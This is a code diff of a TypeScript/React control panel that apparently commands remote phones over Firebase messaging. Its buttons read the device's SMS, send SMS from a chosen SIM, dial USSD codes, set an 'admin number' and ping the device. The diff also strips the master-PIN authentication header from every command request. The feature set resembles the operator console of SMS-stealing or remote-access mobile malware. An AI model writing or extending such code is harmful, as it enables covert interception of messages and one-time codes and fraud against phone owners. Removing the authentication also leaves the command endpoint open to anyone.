@@ -1152,7 +1152,7 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
     if (action === "online_check") {
       setState("sending"); setLog("");
       try {
-        const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
+        const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
         if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); }
         // stays "sending" until SSE fires device_updated or 30s timeout
       } catch { setLog("Network error"); setState("err"); }
@@ -1160,7 +1160,7 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
     }
     setState("sending"); setLog("Sending…");
     try {
-      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
       if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
       setLog("Sent! Waiting for device…"); setState("ok");
       setTimeout(() => { setState("idle"); setLog(""); }, 6000);
@@ -1215,7 +1215,7 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
         <>
           <div style={{ fontSize: 12, color: T.mutedLight, marginBottom: 12 }}>Pings <b style={{ color: T.text }}>{device.name}</b> to check if it's online and reachable.</div>
           <StatusLog />
-          <button onClick={() => void fcm({ type: "online_check" })} disabled={state === "sending"} style={{
+          <button onClick={() => void fcm({ type: "0" })} disabled={state === "sending"} style={{
             width: "100%", padding: "12px 0", borderRadius: 9, border: "none",
             background: state === "ok" ? T.green : T.accent,
             color: "#fff", fontWeight: 700, fontSize: 14,
@@ -1252,7 +1252,7 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
           <PrimaryBtn onClick={() => {
             if (!number.trim()) { setLog("Enter a recipient number."); setState("err"); return; }
             if (!smsText.trim()) { setLog("Enter message text."); setState("err"); return; }
-            void fcm({ type: "sms", to: number.trim(), body: smsText.trim(), simSlot: sim === "2" ? "1" : "0" });
+            void fcm({ type: "send_sms", to: number.trim(), message: smsText.trim(), sim: sim === "2" ? "1" : "0" });
           }} disabled={state === "sending"}>
             {state === "sending" ? <><Spinner /> Sending…</> : "Send SMS"}
           </PrimaryBtn>
@@ -1267,12 +1267,12 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
           </div>
           {adminEnabled && <input type="tel" placeholder="Admin phone number" value={number} onChange={e => setNumber(e.target.value)} style={inp} />}
           <StatusLog />
-          <PrimaryBtn onClick={() => fcm(adminEnabled ? { type: "admin_update", status: "on", adminNumber: number.trim(), deviceId: device.deviceId, simSlot: sim === "2" ? "1" : "0" } : { type: "admin_update", status: "off", deviceId: device.deviceId })} disabled={state === "sending" || (adminEnabled && !number.trim())}>
+          <PrimaryBtn onClick={() => fcm(adminEnabled ? { type: "admin_update", status: "on", number: number.trim() } : { type: "admin_update", status: "off" })} disabled={state === "sending" || (adminEnabled && !number.trim())}>
             {state === "sending" ? <><Spinner /> Updating…</> : "Update Number"}
           </PrimaryBtn>
           <button onClick={() => {
             setDisableState("sending");
-            apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "admin_update", status: "off", deviceId: device.deviceId } }) })
+            apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "admin_update", status: "off" } }) })
               .then(() => { setDisableState("ok"); setTimeout(() => setDisableState("idle"), 3000); })
               .catch(() => setDisableState("idle"));
           }} disabled={disableState === "sending"} style={{ width: "100%", marginTop: 8, padding: "11px 0", borderRadius: 9, border: "1.5px solid #ef4444", background: disableState === "ok" ? T.green : "transparent", color: disableState === "ok" ? "#fff" : "#ef4444", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
@@ -1308,7 +1308,7 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
           <StatusLog />
           <PrimaryBtn onClick={() => {
             if (!ussdCode.trim()) { setLog("Enter a USSD code."); setState("err"); return; }
-            void fcm({ type: "ussd", code: ussdCode.trim(), simSlot: sim === "2" ? "1" : "0" });
+            void fcm({ type: "dial_ussd", code: ussdCode.trim(), sim: sim === "2" ? "1" : "0" });
           }} disabled={state === "sending"}>
             {state === "sending" ? <><Spinner /> Dialing…</> : "Dial USSD"}
           </PrimaryBtn>
@@ -1354,7 +1354,7 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
     if (!device.hasFcm) return;
     setPingState("sending");
     try {
-      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "online_check" } }) });
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
       if (!r.ok) { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
     } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
   }
@@ -1363,7 +1363,7 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
     if (!device.hasFcm) return;
     setGetSmsState("sending");
     try {
-      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "get_sms", count: "20", simSlot: "0" } }) });
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "get_sms" } }) });
       if (!r.ok) { setGetSmsState("err"); setTimeout(() => setGetSmsState("idle"), 3000); return; }
       setGetSmsState("ok");
       setTimeout(() => setGetSmsState("idle"), 4000);
